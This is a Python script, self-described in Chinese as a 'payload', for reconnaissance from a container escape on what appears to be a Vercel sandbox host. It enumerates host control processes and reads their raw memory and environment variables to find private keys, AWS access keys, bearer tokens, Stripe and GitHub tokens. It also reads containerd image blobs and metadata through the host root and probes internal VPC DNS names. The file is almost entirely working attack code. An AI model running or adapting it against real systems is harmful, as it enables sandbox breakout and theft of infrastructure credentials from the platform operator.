# -*- coding: utf-8 -*-
"""v182 payload: 宿主视角 (nopid 容器) root 内存侦察 + containerd blobs + VPC DNS
由 vda182_guest.py (containerd nopid 容器) 执行, 输出 /vercel/sandbox/v182c.out"""
import socket, struct, time, json, os, signal, re, subprocess

OUT = '/vercel/sandbox/v182c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(260)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


log('=== 0 identity ===')
try:
    log('uid=%d' % os.getuid())
    log('cgroup: %s' % open('/proc/self/cgroup').read().replace('\n', ' '))
except Exception as e:
    log('ID EXC %s' % e)

# ============ 1: 宿主进程列表 ============
log('=== 1 procs ===')
procs = {}
try:
    for d in sorted(os.listdir('/proc'), key=lambda x: int(x) if x.isdigit() else 0):
        if not d.isdigit():
            continue
        try:
            cmd = open('/proc/%s/cmdline' % d).read().replace('\x00', ' ')
            if not cmd:
                continue
        except Exception:
            continue
        if any(x in cmd for x in ['celld', 'sandbox-init', 'sandboxctrl', 'containerd', 'shim']):
            procs[d] = cmd[:110]
            log('PROC %s: %s' % (d, cmd))
except Exception as e:
    log('PROCS EXC %s' % e)
log('TARGETS: %s' % sorted(procs.keys()))

# ============ 2: 进程内存 grep ============
log('=== 2 mem grep ===')
KWS = [b'BEGIN.*PRIVATE KEY', b'AKIA', b'ASIA', b'client_secret', b'mongodb',
       b'Bearer ', b'--pubkey', b'ed25519', b'sk_live', b'ghp_', b'-----BEGIN',
       b'api.vercel.com', b'vercel.internal', b'Authorization']


def mem_grep(pid, kws, limit=8, max_seg=24 * 1024 * 1024):
    try:
        maps = open('/proc/%s/maps' % pid).read().splitlines()
        hits = 0
        nseg = 0
        for ln in maps:
            if hits >= limit or nseg > 80:
                break
            p = ln.split()
            if len(p) < 6 or 'r' not in p[1] or '[' in p[5]:
                continue
            a, b = p[0].split('-')
            start = int(a, 16)
            end = int(b, 16)
            size = end - start
            if size > max_seg:
                start = end - max_seg
                size = max_seg
            try:
                with open('/proc/%s/mem' % pid, 'rb', 0) as mf:
                    mf.seek(start)
                    chunk = mf.read(size)
                nseg += 1
                for kw in kws:
                    if kw not in chunk:
                        continue
                    for mm in re.finditer(kw, chunk):
                        i = mm.start()
                        seg = chunk[max(0, i - 60):i + 220]
                        printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                        if printable * 10 < len(seg) * 4:
                            continue
                        log('MEM %s %r @%x: %r' % (pid, kw, start + i, seg[:260]))
                        hits += 1
                        if hits >= limit:
                            break
                    if hits >= limit:
                        break
            except Exception:
                pass
        log('MEM %s done hits=%d segs=%d' % (pid, hits, nseg))
    except Exception as e:
        log('MEM %s EXC %s' % (pid, e))


for pid in sorted(procs.keys(), key=lambda x: int(x)):
    mem_grep(pid, KWS, limit=8)

# ============ 3: 进程 environ ============
log('=== 3 env ===')
for pid in sorted(procs.keys(), key=lambda x: int(x)):
    try:
        e = open('/proc/%s/environ' % pid).read().replace('\x00', '\n')
        log('ENV %s:\n%s' % (pid, e[:900]))
    except Exception as e2:
        log('ENV %s EXC %s' % (pid, e2))

# ============ 4: containerd blobs ============
log('=== 4 blobs ===')
try:
    base = '/proc/1/root/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256'
    blobs = sorted(os.listdir(base))
    log('BLOBS count=%d' % len(blobs))
    for b in blobs:
        try:
            p = os.path.join(base, b)
            d = open(p, 'rb').read(5000)
            if d[:1] == b'{' and b'config' in d and b'layers' in d:
                log('MANIFEST %s (%d): %r' % (b, len(d), d[:700]))
        except Exception:
            pass
except Exception as e:
    log('BLOBS EXC %s' % e)

# ============ 5: containerd metadata ============
log('=== 5 meta ===')
try:
    meta = '/proc/1/root/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
    d = open(meta, 'rb').read()
    log('META db size=%d' % len(d))
    seen = set()
    for mm in re.finditer(rb'[A-Za-z0-9._-]+\.(?:dkr\.ecr|amazonaws\.com)[/A-Za-z0-9._:@-]{5,120}', d):
        s = mm.group(0)
        if s not in seen:
            seen.add(s)
            log('META IMG: %r' % s[:140])
            if len(seen) > 15:
                break
except Exception as e:
    log('META EXC %s' % e)

# ============ 6: VPC DNS ============
log('=== 6 dns ===')


def dns_q(name, srv='172.31.0.2'):
    try:
        q = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        for part in name.split('.'):
            q += bytes([len(part)]) + part.encode()
        q += b'\x00\x00\x01\x00\x01'
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(q, (srv, 53))
        d, a = s.recvfrom(1024)
        s.close()
        ips = []
        for mm in re.finditer(rb'\xc0\x0c\x00\x01\x00\x01', d):
            i = mm.start()
            if i + 16 <= len(d):
                ips.append(socket.inet_ntoa(d[i + 12:i + 16]))
        return '%d bytes ips=%r' % (len(d), ips)
    except Exception as e:
        return 'EXC %s' % e


for name in ['vercel.internal', 'cell.vercel.internal', 'sandbox.vercel.internal',
             'api.vercel.internal', 'hive.vercel.internal', 'sandboxctrl.vercel.internal',
             'celld.vercel.internal', 'ec2.internal', 'instance-data.ec2.internal',
             'compute.internal', 'sandbox-controller.ecr.us-east-1.amazonaws.com']:
    log('DNSQ %s -> %s' % (name, dns_q(name)))

# ============ 7: exe 链接 ============
log('=== 7 exe ===')
for pid in sorted(procs.keys(), key=lambda x: int(x)):
    try:
        exe = os.readlink('/proc/%s/exe' % pid)
        log('EXE %s -> %s' % (pid, exe))
    except Exception as e2:
        log('EXE %s EXC %s' % (pid, e2))

log('V182_DONE')
f.close()
